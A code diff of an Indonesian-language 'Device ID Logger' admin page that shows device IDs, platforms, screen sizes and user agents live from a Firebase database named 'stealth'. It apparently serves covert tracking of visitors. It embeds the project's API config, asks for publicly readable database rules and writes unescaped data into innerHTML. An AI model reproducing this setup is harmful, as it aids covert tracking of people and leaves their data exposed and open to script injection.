@@ -5,11 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Panel - Device ID</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0a1a;
             color: #ccc;
@@ -78,17 +74,27 @@
             font-size: 12px;
             text-align: center;
         }
+        .live-badge {
+            color: #00ff88;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .danger {
+            color: #ff4444;
+        }
     </style>
 </head>
 <body>
-    <h1>🕵️ DEVICE ID LOGGER</h1>
+    <h1>🕵️ DEVICE ID LOGGER <span class="live-badge">● LIVE</span></h1>
     <div class="stats">
         <span>📱 Total perangkat: <strong id="count">0</strong></span>
-        <span>🕒 Data terakhir: <strong id="lastTime">-</strong></span>
+        <span>🕒 Update terakhir: <strong id="lastTime">-</strong></span>
     </div>
-    <button class="btn" onclick="refreshData()">🔄 Refresh</button>
-    <button class="btn" onclick="clearData()">🗑️ Hapus semua</button>
     <button class="btn" onclick="exportCSV()">⬇️ Export CSV</button>
+    <button class="btn" onclick="location.reload()">🔄 Refresh</button>
 
     <table>
         <thead>
@@ -96,79 +102,118 @@
                 <th>#</th>
                 <th>Device ID</th>
                 <th>Waktu</th>
+                <th>Platform</th>
+                <th>Screen</th>
                 <th>User Agent</th>
             </tr>
         </thead>
         <tbody id="dataBody">
-            <tr><td colspan="4" style="text-align:center; color:#555;">Belum ada data</td></tr>
+            <tr><td colspan="6" style="text-align:center; color:#555;">⏳ Loading data...</td></tr>
         </tbody>
     </table>
-    <div class="footer">— data disimpan di localStorage browser ini aja —</div>
+    <div class="footer">⚠️ <span class="danger">PUBLIC MODE</span> — data real-time dari Firebase Realtime Database</div>
 
-    <script>
-        function renderTable() {
-            const raw = localStorage.getItem('deviceData');
-            const data = raw ? JSON.parse(raw) : [];
+    <script type="importmap">
+    {
+        "imports": {
+            "firebase/app": "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js",
+            "firebase/database": "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js"
+        }
+    }
+    </script>
+
+    <script type="module">
+        import { initializeApp } from 'firebase/app';
+        import { getDatabase, ref, onValue } from 'firebase/database';
+
+        // CONFIG LO
+        const firebaseConfig = {
+            apiKey: "AIzaSyAKk8yOBe0AJbu9krI0DigvIJpATFWXezE",
+            authDomain: "stealth-c7df6.firebaseapp.com",
+            databaseURL: "https://stealth-c7df6-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "stealth-c7df6",
+            storageBucket: "stealth-c7df6.firebasestorage.app",
+            messagingSenderId: "167464139264",
+            appId: "1:167464139264:web:62b093af1066bf8084b6e5",
+            measurementId: "G-0VE28H406J"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const dataRef = ref(db, 'devices');
+
+        function renderTable(data) {
             const tbody = document.getElementById('dataBody');
             const count = document.getElementById('count');
             const lastTime = document.getElementById('lastTime');
 
-            count.textContent = data.length;
-            if (data.length > 0) {
-                const last = data[data.length - 1];
-                lastTime.textContent = new Date(last.time).toLocaleString('id-ID');
-            } else {
+            if (!data) {
+                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:#555;">Belum ada data</td></tr>';
+                count.textContent = '0';
                 lastTime.textContent = '-';
-            }
-
-            if (data.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#555;">Belum ada data</td></tr>';
                 return;
             }
 
+            const entries = Object.values(data);
+            count.textContent = entries.length;
+
+            if (entries.length > 0) {
+                const last = entries[entries.length - 1];
+                lastTime.textContent = new Date(last.time).toLocaleString('id-ID');
+            }
+
             let html = '';
-            data.forEach((item, idx) => {
+            entries.slice().reverse().forEach((item, idx) => {
                 html += `<tr>
                     <td>${idx + 1}</td>
-                    <td class="id-highlight">${item.id}</td>
-                    <td>${new Date(item.time).toLocaleString('id-ID')}</td>
-                    <td style="font-size:11px; color:#888;">${item.userAgent.substring(0, 60)}...</td>
+                    <td class="id-highlight">${item.id || 'N/A'}</td>
+                    <td>${item.time ? new Date(item.time).toLocaleString('id-ID') : '-'}</td>
+                    <td>${item.platform || '-'}</td>
+                    <td>${item.screen || '-'}</td>
+                    <td style="font-size:11px; color:#888;">${(item.userAgent || '').substring(0, 50)}...</td>
                 </tr>`;
             });
             tbody.innerHTML = html;
         }
 
-        function refreshData() {
-            renderTable();
-        }
+        // Real-time listener
+        onValue(dataRef, (snapshot) => {
+            const data = snapshot.val();
+            renderTable(data);
+        }, (error) => {
+            console.error('Error baca data:', error);
+            document.getElementById('dataBody').innerHTML = 
+                '<tr><td colspan="6" style="text-align:center; color:#ff4444;">❌ Gagal konek ke Firebase. Cek rules! Harus true.</td></tr>';
+        });
 
-        function clearData() {
-            if (confirm('Yakin hapus semua data device ID?')) {
-                localStorage.removeItem('deviceData');
-                renderTable();
-            }
-        }
-
-        function exportCSV() {
-            const raw = localStorage.getItem('deviceData');
-            const data = raw ? JSON.parse(raw) : [];
-            if (data.length === 0) {
+        // Export CSV
+        window.exportCSV = function() {
+            const tbody = document.getElementById('dataBody');
+            const rows = tbody.querySelectorAll('tr');
+            if (rows.length === 0 || rows[0].textContent.includes('Belum ada') || rows[0].textContent.includes('Gagal')) {
                 alert('Tidak ada data buat di-export!');
                 return;
             }
-            let csv = 'Device ID,Waktu,User Agent\n';
-            data.forEach(item => {
-                csv += `"${item.id}","${item.time}","${item.userAgent.replace(/"/g, '""')}"\n`;
+
+            let csv = 'Device ID,Waktu,Platform,Screen,User Agent\n';
+            rows.forEach(row => {
+                const cols = row.querySelectorAll('td');
+                if (cols.length === 6) {
+                    const id = cols[1].textContent;
+                    const time = cols[2].textContent;
+                    const platform = cols[3].textContent;
+                    const screen = cols[4].textContent;
+                    const ua = cols[5].textContent.replace(/,/g, '');
+                    csv += `"${id}","${time}","${platform}","${screen}","${ua}"\n`;
+                }
             });
+
             const blob = new Blob([csv], { type: 'text/csv' });
             const link = document.createElement('a');
             link.href = URL.createObjectURL(blob);
-            link.download = 'device_ids.csv';
+            link.download = `device_ids_${new Date().toISOString().slice(0,10)}.csv`;
             link.click();
-        }
-
-        // Auto render
-        renderTable();
+        };
     </script>
 </body>
 </html>
